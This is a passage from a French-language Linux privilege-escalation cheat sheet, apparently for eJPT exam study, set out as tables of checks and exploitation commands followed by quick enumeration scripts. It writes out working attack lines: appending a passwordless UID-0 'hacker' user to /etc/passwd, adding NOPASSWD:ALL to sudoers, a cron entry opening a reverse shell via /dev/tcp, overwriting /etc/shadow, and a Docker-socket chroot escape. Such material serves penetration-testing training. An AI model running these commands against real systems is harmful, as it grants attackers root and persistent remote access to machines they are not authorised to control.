| **`/etc/passwd`** | `ls -la /etc/passwd` | Ajouter utilisateur root: `echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd` |
| **`/etc/shadow`** | `ls -la /etc/shadow` | Modifier hash root ou ajouter utilisateur |
| **`/etc/sudoers`** | `ls -la /etc/sudoers` | Ajouter: `username ALL=(ALL) NOPASSWD:ALL` |
| **`/etc/crontab`** | `ls -la /etc/crontab` | Ajouter: `* * * * * root /bin/bash -i >& /dev/tcp/ip/port 0>&1` |
| **`/etc/hosts`** | `ls -la /etc/hosts` | Rediriger domaines critiques |
| **`/etc/fstab`** | `ls -la /etc/fstab` | Monter partitions avec options dangereuses |

### 🔴 Modification directe du mot de passe root
| Méthode | Commande | Conditions |
|---------|----------|-----------|
| **Passwd writable** | `echo 'root:password123' \| chpasswd` | Si /etc/passwd writable + chpasswd disponible |
| **Shadow writable** | `echo 'root:$6$salt$hash' > /tmp/shadow && cp /tmp/shadow /etc/shadow` | Si /etc/shadow writable |
| **Usermod** | `usermod -p '$6$salt$hash' root` | Si usermod disponible avec privilèges |
| **Passwd sans root** | `echo -e "newpass\nnewpass" \| passwd` | Si dans groupe shadow |

### 🔴 Ajout d'utilisateur root alternatif
| Méthode | Commande | Description |
|---------|----------|-------------|
| **User UID 0** | `echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd` | Utilisateur avec UID 0 (root) |
| **Group wheel** | `usermod -aG wheel username` | Ajouter au groupe admin |
| **Sudo sans password** | `echo 'username ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` | Sudo sans mot de passe |

### 🔴 Cron jobs exploitables
| Vérification | Commande | Exploitation |
|--------------|----------|--------------|
| **Cron writable** | `ls -la /etc/cron*` | Modifier scripts existants |
| **Scripts cron writable** | `find /etc/cron* -type f -writable 2>/dev/null` | Injecter commandes |
| **Cron PATH hijacking** | `cat /etc/crontab \| grep PATH` | Créer binaires malveillants dans PATH |
| **User crontab** | `crontab -l` puis `ls -la` sur scripts | Modifier scripts utilisateur |

### 🔴 Services et démons vulnérables
| Service | Vérification | Exploitation |
|---------|--------------|--------------|
| **Docker socket** | `ls -la /var/run/docker.sock` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| **LXD group** | `id \| grep lxd` | Escalation via conteneurs LXD |
| **Systemd services** | `find /etc/systemd -writable 2>/dev/null` | Modifier services systemd |

### 🔴 Variables d'environnement dangereuses
| Variable | Vérification | Exploitation |
|----------|--------------|--------------|
| **LD_PRELOAD** | `sudo -l \| grep LD_PRELOAD` | Injection de bibliothèque |
| **LD_LIBRARY_PATH** | `sudo -l \| grep LD_LIBRARY_PATH` | Hijacking de bibliothèques |
| **PATH** | `sudo -l \| grep env_keep.*PATH` | PATH hijacking |

### 🔴 Sudo misconfigurations avancées
| Misconfiguration | Vérification | Exploitation |
|------------------|--------------|--------------|
| **NOPASSWD: ALL** | `sudo -l \| grep NOPASSWD.*ALL` | Accès root direct |
| **Wildcards dangereux** | `sudo -l \| grep "\*"` | Exploitation de wildcards |
| **Env_keep dangereux** | `sudo -l \| grep env_keep` | Variables d'environnement préservées |
| **Sudo sans TTY** | `sudo -l \| grep "!requiretty"` | Exécution sans terminal |

### 🔴 NFS et partages réseau
| Vérification | Commande | Exploitation |
|--------------|----------|--------------|
| **NFS no_root_squash** | `cat /etc/exports \| grep no_root_squash` | Monter en tant que root |
| **NFS exports** | `showmount -e localhost` | Voir partages exportés |
| **Samba writable** | `smbclient -L localhost` | Partages Samba accessibles |

---

## 🔧 17. Scripts de vérification rapide des misconfigurations

### Script de check complet
```bash
#!/bin/bash
echo "=== CRITICAL MISCONFIGURATIONS CHECK ==="

echo "[+] Checking writable system files..."
for file in /etc/passwd /etc/shadow /etc/sudoers /etc/crontab; do
    if [ -w "$file" ]; then
        echo "CRITICAL: $file is writable!"
    fi
done

echo "[+] Checking sudo configuration..."
sudo -l 2>/dev/null | grep -E "(NOPASSWD|ALL|env_keep|LD_PRELOAD)"

echo "[+] Checking SUID files..."
find / -perm -4000 2>/dev/null | head -10

echo "[+] Checking Docker socket..."
ls -la /var/run/docker.sock 2>/dev/null

echo "[+] Checking NFS exports..."
cat /etc/exports 2>/dev/null | grep no_root_squash

echo "[+] Checking writable cron jobs..."
find /etc/cron* -type f -writable 2>/dev/null
```

### One-liner critique pour eJPT
```bash
echo "WRITABLES:" && ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab 2>/dev/null | grep "^-rw" && echo "SUDO:" && sudo -l 2>/dev/null | grep NOPASSWD && echo "DOCKER:" && ls -la /var/run/docker.sock 2>/dev/null
```

### Vérifications essentielles (30 secondes)
```bash
# Check des fichiers critiques modifiables
ls -la /etc/passwd /etc/shadow /etc/sudoers | grep -v "root root"

# Sudo sans password
sudo -l 2>/dev/null | grep -i nopasswd

# Docker socket accessible
[ -w /var/run/docker.sock ] && echo "Docker socket writable!"

# NFS dangereux
grep no_root_squash /etc/exports 2>/dev/null
```